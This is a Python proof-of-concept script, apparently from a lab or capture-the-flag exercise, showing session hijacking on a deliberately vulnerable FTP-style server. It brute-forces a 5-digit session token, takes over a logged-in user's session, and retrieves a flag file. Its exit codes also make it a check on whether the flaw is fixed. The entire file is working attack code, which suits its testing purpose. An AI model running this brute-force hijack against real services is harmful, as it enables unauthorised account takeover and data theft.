#!/usr/bin/env python3
"""
PoC #5: Session hijacking via predictable tokens
----------------------------------------------------
PASS issues a 5-digit token (00000-99999) generated by rand(), seeded
once at process start, and SESS accepts any token with no password and
no binding to the connection that requested it. The keyspace is tiny -
100,000 values - so a brute-force costs nothing.

This PoC starts a "victim" session (a real login that just sits idle)
and an "attacker" connection that never authenticates, brute-forces SESS
until it lands on the victim's token, then proves control isn't just a
status code: the hijacked session RETRs an authenticated-only credential
the deployment materializes INSIDE the served root (vault/manifest.dat,
from the runtime FMM_FLAG - see write_flag_files() in fmm.cpp). RETR of a
within-root path is correct, allowed behaviour, so this disclosure is
INDEPENDENT of the CWD/LIST-containment fix (#4) - fixing #4 does not flip
this PoC; the predictable-token hijack itself is what it proves.

Run the server first: ./fmm
Then:  python3 05_session_hijack.py [host] [port]
"""
import os
import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

EXPECTED_FLAG = os.environ.get("FMM_FLAG") or "FLAG{local-dev-default}"
# Authenticated-only secret inside the served root; content is the flag.
VAULT_FILE = "vault/manifest.dat"


def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.recv(4096)
    return s


def cmd(s, line):
    s.sendall((line + "\n").encode())
    return s.recv(4096).decode(errors="replace")


def open_pasv(s):
    reply = cmd(s, "PASV")
    nums = reply[reply.index("(") + 1:reply.index(")")].split(",")
    port = int(nums[4]) * 256 + int(nums[5])
    return socket.create_connection((".".join(nums[:4]), port), timeout=5)


def drain(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = b""
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            chunks += d
    except socket.timeout:
        pass
    return chunks.decode(errors="replace")


def start_victim():
    """Log in as a legitimate user and just idle - simulating a live session."""
    s = connect()
    cmd(s, "USER alice")
    cmd(s, "PASS password123")
    return s  # keep the socket open/idle


def main():
    victim_socket = start_victim()
    print("[*] Victim (alice) logged in and idling")

    attacker = connect()
    print("[*] Attacker connected without ever sending USER/PASS - brute-forcing SESS")

    found = None
    start = time.time()
    resp = ""
    for n in range(100_000):
        token = f"{n:05d}"
        resp = cmd(attacker, f"SESS {token}")
        if resp.startswith("230"):
            found = token
            break
        if n % 10_000 == 0 and n:
            print(f"    ...tried {n} tokens ({time.time() - start:.1f}s elapsed)")

    if not found:
        print("[-] No active session found in the full keyspace")
        attacker.close()
        victim_socket.close()
        sys.exit(1)   # unguessable session -> vuln FIXED

    print(f"[+] Hijacked session with token {found}: {resp.strip()}")
    print("[*] Confirmed authenticated - now proving impact by RETRieving the "
          "authenticated-only secret via the hijacked session")

    data = open_pasv(attacker)
    print(cmd(attacker, f"RETR {VAULT_FILE}").strip())
    body = drain(data)

    m = re.search(r"FLAG\{[^}]+\}", body)
    if m and m.group(0) == EXPECTED_FLAG:
        print(f"[+] Session hijack confirmed - stole alice's session and "
              f"disclosed this deployment's secret: {m.group(0)}")
        attacker.close()
        victim_socket.close()
        sys.exit(0)   # exploited -> vuln OPEN
    elif m:
        print(f"[-] RETR returned a flag-shaped value but it didn't match "
              f"FMM_FLAG for this run: {m.group(0)!r}")
    else:
        print(f"[-] Hijacked the session but could not read the secret: {body!r}")
    attacker.close()
    victim_socket.close()
    sys.exit(1)       # blocked -> vuln FIXED


if __name__ == "__main__":
    main()
